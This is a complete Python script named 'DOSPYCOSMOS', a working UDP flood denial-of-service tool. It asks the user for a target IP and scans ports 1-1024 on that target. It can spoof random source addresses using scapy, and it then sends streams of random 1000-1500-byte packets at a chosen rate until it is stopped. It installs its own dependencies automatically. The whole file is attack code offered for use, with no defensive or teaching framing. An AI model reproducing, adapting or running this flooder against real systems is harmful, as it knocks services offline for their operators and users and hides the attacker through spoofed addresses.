import os, sys, random, time, threading
import socket

def install(package):
    import subprocess
    subprocess.call([sys.executable, "-m", "pip", "install", package])

try:
    from colorama import Fore, Style
except:
    install("colorama")
    from colorama import Fore, Style

GREEN = Fore.GREEN
print(GREEN + "\n===== DOSPYCOSMOS =====\n" + Style.RESET_ALL)

target_ip = input(GREEN + "Target IP: " + Style.RESET_ALL)
spoof_choice = input(GREEN + "Spoof source IP? (y/n): " + Style.RESET_ALL).lower()
speed_choice = int(input(GREEN + "Speed (50/100/200/500 MB): " + Style.RESET_ALL))
use_scapy = input(GREEN + "Use scapy? (y/n): " + Style.RESET_ALL).lower()

speed_map = {50: 0.01, 100: 0.005, 200: 0.002, 500: 0.001}
delay = speed_map.get(speed_choice, 0.01)

stop_flag = False

if use_scapy == 'y':
    try:
        from scapy.all import IP, UDP, Raw, send, sr1
    except:
        install("scapy")
        from scapy.all import IP, UDP, Raw, send, sr1

    open_ports = []
    for port in range(1, 1025):
        ans = sr1(IP(dst=target_ip)/UDP(dport=port), timeout=0.5, verbose=0)
        if ans is None:
            open_ports.append(port)

    if not open_ports:
        target_port = int(input(GREEN + "No open UDP port found, enter port manually: " + Style.RESET_ALL))
    else:
        target_port = random.choice(open_ports)
else:
    target_port = int(input(GREEN + "Enter target UDP port: " + Style.RESET_ALL))

print(GREEN + f"Using target port {target_port}" + Style.RESET_ALL)

def attack_scapy():
    global stop_flag
    hits = 0
    while not stop_flag:
        if spoof_choice == "y":
            src_ip = ".".join(str(random.randint(1,254)) for _ in range(4))
        else:
            src_ip = None
        payload_size = random.randint(1000,1500)
        payload = os.urandom(payload_size)
        pkt = IP(dst=target_ip)/UDP(sport=random.randint(1024,65535), dport=target_port)/Raw(load=payload)
        if src_ip:
            pkt[IP].src = src_ip
        send(pkt, verbose=0)
        hits += 1
        print(GREEN + f"HITS: {hits} | {payload_size} bytes -> {target_ip}:{target_port}" + Style.RESET_ALL)
        time.sleep(delay)

def attack_socket():
    global stop_flag
    hits = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_flag:
        payload_size = random.randint(1000,1500)
        payload = os.urandom(payload_size)
        sock.sendto(payload, (target_ip, target_port))
        hits += 1
        print(GREEN + f"HITS: {hits} | {payload_size} bytes -> {target_ip}:{target_port}" + Style.RESET_ALL)
        time.sleep(delay)

def wait_for_enter():
    global stop_flag
    input(GREEN + "\nPress ENTER to stop...\n" + Style.RESET_ALL)
    stop_flag = True

if use_scapy == 'y':
    threading.Thread(target=attack_scapy).start()
else:
    threading.Thread(target=attack_socket).start()

wait_for_enter()
print(GREEN + "Attack stopped." + Style.RESET_ALL)